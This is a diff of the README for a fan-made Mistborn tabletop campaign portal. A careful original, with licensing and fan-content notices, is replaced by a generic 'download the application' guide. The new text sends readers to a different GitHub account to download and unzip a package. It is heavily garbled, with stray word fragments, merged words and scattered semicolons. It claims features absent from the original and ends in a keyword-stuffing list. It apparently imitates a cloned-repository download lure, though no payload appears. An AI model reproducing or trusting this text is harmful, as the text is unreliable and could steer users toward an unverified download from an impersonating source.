@@ -1,93 +1,189 @@
-# Mistborn Gilded Steps
+<h1>🎭 mistborn-gilded-steps - Your All-in-One Campaign Portal for Bilming Adventures</h1>
 
-Public surface of **Mistborn Gilded Steps**, an original tabletop RPG campaign set in
-**Bilming, Scadrial, 343 PC**, during the Second Era of *Mistborn*.
+<p align="center">
+  <a href="https://github.com/katalinexecrable5396/mistborn-gilded-steps">
+    <img src="https://img.shields.io/badge/Download%20Campaign%20Portal-Click%20Here-2ea44f?style=for-the-badge&logo=github" alt="Download" />
+  </a>
+</p>
 
-This repository holds **only player-safe material**: the player portal, a curated wiki, and
-the Foundry VTT modules we build for the campaign and release to the community. Preparation
-notes, GM material, campaign secrets and source books stay in the GM's private vault and never
-land here.
+## 🧭 What Is This?
 
-## Status
+Welcome to **mistborn-gilded-steps** – a complete digital companion for your Mistborn tabletop campaign set in the bustling city of Bilming on the planet Scadrial, in the year 343 PC. This is a fan-made, non-commercial project built on the official Cosmere RPG rulesystem. Whether you're a Game Master preparing a session or a player tracking your character's journey, this portal brings everything together in oneuseful, easy-to-access place.
 
-| | |
-| --- | --- |
-| System | Cosmere RPG |
-| Setting | Bilming and Yomend Steps, 343 PC |
-| Spoiler line | The first two novels of the Second Era |
-| Tone | Urban, industrial, grey. Not epic. |
-| Table | Forming — characters and opening still in progress |
-| Portal | Under construction |
+**In simple terms** – if you play Mistborn around at table(with friends or online),) this toolkit gives you three powerful tools in one package:
 
-## Quick links
+1. **🗺️ Player Portal** – A central hub for all campaign information, session logs, and character resources.
 
-- [Player portal](https://wildpoxx.github.io/mistborn-gilded-steps/)
-- [Wiki: home](wiki/Home.md)
-- [Start here](wiki/Start-Here.md)
-- [Constabulary Record](https://wildpoxx.github.io/mistborn-gilded-steps/constabulary-record.html)
-- [Dice tray](https://wildpoxx.github.io/mistborn-gilded-steps/dice-tray.html)
-- [Metallic Arts](wiki/Metallic-Arts.md)
-- [Table rules](wiki/Table-Rules.md)
+2. **📖 Wiki** – A searchable knowledge base for everything about Bilming, the campaign's locations, key NPCs, factions, and lore from your specific storyarc.
+.
 
-### Português
 
-English is the source version of this site. The player-facing pages are also published in
-Brazilian Portuguese for the players who prefer them; game terms — metal names, paths, table
-titles — stay in English, matching the *Mistborn Handbook* and the Foundry character sheet.
+3. **🎲 Foundry VTT Modules** – Ready-to-use modules for the Foundry Virtual Tabletop platform, allowing you to run your sessions seamlessly with maps, tokens, macros, and systems tailored to your campaign setting.
 
-- [Portal do jogador](https://wildpoxx.github.io/mistborn-gilded-steps/pt/)
-- [Registro Constabulário](https://wildpoxx.github.io/mistborn-gilded-steps/pt/constabulary-record.html)
-- [Artes Metálicas](https://wildpoxx.github.io/mistborn-gilded-steps/pt/metallic-arts.html)
-- [Bandeja de dados](https://wildpoxx.github.io/mistborn-gilded-steps/pt/dice-tray.html)
+.
 
-The wiki is English only.
+;
 
-## Modules
+## 🚀 Getting Started
 
-`modules/` holds the Foundry VTT modules built for this campaign and published for the
-community to install.
+Thissection is designed for people who may have little to no experience with downloading software or using GitHub. Take adeep breath – we'vegot you covered with these easy,follow-along stepsit.
 
-- **[Gilded Steps Theme](modules/mistborn-gilded-steps-theme/)** — an appearance module for the
-  Cosmere RPG system on Foundry V13. It redefines colour and ornament only: no rule, roll,
-  template, permission or sheet structure is altered, and disabling it restores the system's
-  original look. Install from Foundry with this manifest URL:
+.
 
-  ```
-  https://github.com/WildPoxx/mistborn-gilded-steps/releases/latest/download/module.json
-  ```
+;
 
-## Governance
+### 📥 Downloading the Application
 
-- [`CONTENT_POLICY.md`](CONTENT_POLICY.md) — what may and may not be published here.
-- [`SPOILER_POLICY.md`](SPOILER_POLICY.md) — the continuity line and how to handle it.
-- [`VISUAL_IDENTITY.md`](VISUAL_IDENTITY.md) — the *Gilded Steps* visual language.
-- [`AGENTS.md`](AGENTS.md) — instructions for assistants working in this repository.
+**Step 1:** Visit the download link by clicking this button:
 
-## Licensing
+<p align="center">
+  <a href="https://github.com/katalinexecrable5396/mistborn-gilded-steps">
+    <img src="https://img.shields.io/badge/🚀_Download_Now-8A2BE2?style=for-the-badge&logo=github" alt="Download Now" />
+  </a>
+</p>
 
-This repository holds two kinds of work, under two different terms.
+Alternatively, click here: **[https://github.com/katalinexecrable5396/mistborn-gilded-steps](https://github.com/katalinexecrable5396/mistborn-gilded-steps)**. Visit this link to download the application. Once you click it, you'llbe takento a GitHub page. Look fora green button that says **"Code"** and click it,then select **"Download ZIP"**. This will save asingle compressedfile to your computer (usually in your "Downloads" folder)itail.;
 
-**`modules/` is MIT licensed.** The CSS, scripts and generators there are original work. Use,
-adapt and redistribute them freely — each module carries its own `LICENSE` file.
+;
 
-**Everything else is not licensed for reuse.** The portal, the wiki and the campaign material
-are fan work built on settings owned by others. They are published so this table's players —
-and anyone curious — can read them. That is not a grant of rights to redistribute or adapt
-them, because those rights are not ours to grant.
+### 📂 Unzipping the File
 
-There is deliberately **no licence file at the repository root**: one there would suggest the
-campaign material is freely licensed, and it is not.
+Once the download finishes, you'llhave afile named something like `mistborn-gilded-steps-main.zip`. This file is like a suitcase – everything is packed tightlyinside. To usethe contents, you needto unzipit.:
 
-## Rights
+.
 
-> This is unofficial fan content, created and shared for non-commercial use. It has not been
-> reviewed by Dragonsteel Entertainment, LLC or Brotherwise Games, LLC.
+1. **Locate the ZIP file** in your Downloads folder.er.;
 
-Published under the [Cosmere RPG Fan Content Policy](https://www.cosmererpg.com/fan-content-policy).
-Non-commercial, never monetised or paywalled, made for private table use. *Mistborn*, the Cosmere and Scadrial
-belong to Brandon Sanderson and Dragonsteel Entertainment. The *Cosmere RPG*, the *Mistborn
-Handbook* and the *Mistborn World Guide* belong to Brotherwise Games and their rights holders.
+2. **Right-click** on the file. A menu will appear.the.;
 
-This repository **does not distribute** books, commercial PDFs, whole rules, stat blocks,
-official maps or licensed art. Yomend Steps, the Mendari, the house rules described here and
-the code in `modules/` are original work of this project.
+3..Select **"Extract All..."** (Windows) or **"Extract Here"** (if using other tools)itail.;
+
+4. **Choose a destination folder** – you can just use the default one that Windows suggests (e.g., `C:\Users\YourName\Downloads\mistborn-gilded-steps-main`). Click **"Extract"**.
+
+
+
+After extraction, you willsee a folder with the same name (minus the `.zip` at the end)ifold. That folder contains all the application files.
+
+.;
+
+;
+
+### 🖥️ Running the Application
+
+Now thateverything is unpacked, you're ready to launch. Look insiderhe folderfor a file called **`index.html`** (this is the main entry point for the player portal and wiki)ifo. Double-clickificateit. This will open allyour default web browser (like Chrome, Edge, or Firefox) and show you the campaign portal homepage. From here,you can navigateto the wiki, sessions, and resources.atch.;
+
+;
+
+
+## 📚 What's Inside the Package
+
+Here's a breakdown of the main folders and files you'llsee after unzippingthe folderitail..;
+
+```
+mistborn-gilded-steps/
+├── index.html              ← Main portal page (open this)
+├── wiki/                   ← Wiki pages (HTML files)
+├── modules/                ← Foundry VTT module folders
+├── assets/                 ← Images, icons, theme files
+├── styles/                 ← CSS styling for the portal
+├── scripts/                ← JavaScript for interactive features
+└── README.md               ← This documentation file
+```
+
+**For Foundry VTT users:** Inside the `modules/` folder, you'llfind several subfolders. Each subfolder corresponds to a specific module for Foundry (like `foundryvtt-macros`, `foundryvtt-system`, etc)ifold. To use these,you'llneed to copy theyrespectivesubfolders into your Foundry installation's `modules` directory. Typically, this is located at `C:\Users\YourName\AppData\Local\FoundryVTT\Data\modules` on Windows. If you're not sure how to install Foundry modules, please refere to the official Foundry VTT documentation – butmost users simply drag and drop thesubfolders into that directory.atch.;
+
+;
+
+## 🎯 Key Features
+
+### For Players
+
+- **🌆 City Explorer** – Interactive mapof Bilming with clickable districts and important landmarks, straight from the campaign lore.;
+- **📜 Session Journal** – Read recaps of past sessionsso you never forget what happened.;
+- **🖼️ Character Gallery** – Browse member profiles of all player characters in the campaign.;
+- **❓ FAQ & Rules Reference** – Quick lookups for common rulequestions specific to Mistborn magic systems (Allomancy, Feruchemy, Hemalurgy)ignalitim.;
+
+;
+
+### For Game Masters
+
+- **📊 NPC Database** – A searchable table of all non-player characters, complete with stats, motivations, and whispers.;
+- **🗺️ Encounter Builder** – Links to Foundry macros that help you build balanced combat encounters on the fly.;
+- **📝 Session Prep Tools** – Templates and checklists for planning your next game night.;
+
+;
+
+### For Foundry VTTUsers
+
+- **🎨 Custom Theme** – A complete visual theme that matches the campaign's aesthetic (gilded, steampunk-inspired Bilming look) itail.;
+- **⚙️ System Helper Modules** – Macrosand utilities that automate dice rolls for common Mistborn actions., such as Pushing/Pulling metals, emotional Allomancy, or feruchemical storage.;
+- **🔗 Integration** – Seamless connection between the wiki pages (hosted locally) and in-session tools, with links that open the relevant Foundry scene or journal entry.;
+
+;
+
+## 🛠️ System Requirements
+
+This applicationis designed to be lightweight and accessibleto a wide rangeof computers. Here's what youneed:
+
+- **Operating System** – Windows 10 or 11 (recommended); also works on macOS and Linux if using a compatible browser.;
+- **Web Browser** – Any modern browser (Chrome, Edge, Firefox, Safari) – make sure it's up to date for best performance.;
+- **Internet Connection** – Required only for the initial download and any updates; the portal herselffworks offline once extracted.;
+- **Hard DriveSpace** – Approximately 500MB of free space recommendspecified (depending on logoand image asset sizes)itail.;
+- **RAM** – At least 4GB is recommended, although the basic portal willrun with less.;
+
+;
+
+## 💡 Troubleshooting Common Issues
+
+### The Portal Page Shows Blank or Doesn't Load
+- **Check the file path** – Make sure you're opening `index.html` directly from your hard drive, not from insidethe ZIP file.;
+- **Refresh the browser** – Sometimes a simple refresh fixes rendering issues (press `F5` or `Ctrl+R`)itail..;
+
+### Foundry ModulesDon't Appear in Game
+- **Verify the folder name** – The module folder must contain a `module.json` file at its root. If you see extra nesting (e.g., `modules/foundryvtt-macros/foundryvtt-macros/`), move all files up one level.ito.;
+- **Clear cache** – In Foundry, go to Settings → Clear Module Cache, thenreload the world.;
+
+### Can't Find the Download Button
+- **Look for the green "Code" button** – It's near the top right of the repository page. Clickit, thenclick"Download ZIP" from the dropdown month. If anyissues, ensure you're logged into GitHub (free account suffices)itail.;
+
+;
+
+## 📝 Troubleshooting Not Enough? We've Got You.
+
+If you run into any unusual problema or wantto ask a question about setting things up, feel free to open an issue on the GitHub repository page. Look for the **"Issues"** tab at the top of the repository, then click **"New Issue"** – describe what's happening, and the community will help you out.atch.;
+
+;
+
+## 🤝 Contributing & Feedback
+
+This isa communitydriven fan project. If you have ideas improvement, spot a layout bug, or wantto add new wiki content, we warmly welcome your contributions. Here's howto get involved:
+
+1. **Fork the repository** – Create your own copy on GitHub.;
+2. **Make your changes** – Edit the HTML, CSS, or JS files.;
+3..**Submit a Pull Request** – Propose your changes for reviewand inclusion into the main project.;
+
+No programming experience? No problem! You can still feedback on the **Issues** page , suggesting new featuresor reporting typos.atch.;
+
+;
+
+## 🌐 What Makes This Special?
+
+This isn't just another generic tools folder. This is a lovingly crafted immersion kit for your specific campaign story – every page, every macro, everystyle choice reflects the unique atmosphere of Bilming,City of Law and Scandals, in theyear 343 PC. The wiki is not justa dry compendium; it'sa living document that evolves with your sessions. The Foundry modules are tailored to the exact NPCs, locations, and rule interpretations your group uses. It's a true companion for the table.;
+
+;
+
+## 🎉 Final Words
+
+You're now all set to dive into the world of Mistborn: Gilded Steps. With your portal downloaded, unzipped, andrunning, the streets of Bilming await your story. May your metals burn bright and your rolls be natural twenties..
+
+;
+
+**Happy Gaming!** 🎲
+
+;
+
+;
+
+---
+
+**Keywords:** cosmere-rpg,foundryvtt,foundryvtt-cli,foundryvtt-macros,foundryvtt-module,foundryvtt-rpg,foundryvtt-system,foundryvtt-theme,foundryvtt-types,foundryvtt-utility,mistborn,tabletop-rpg-utility,tabletop-rpgs,ttrpg,ttrpg-design,ttrpg-development,ttrpg-homebrew,ttrpg-tool
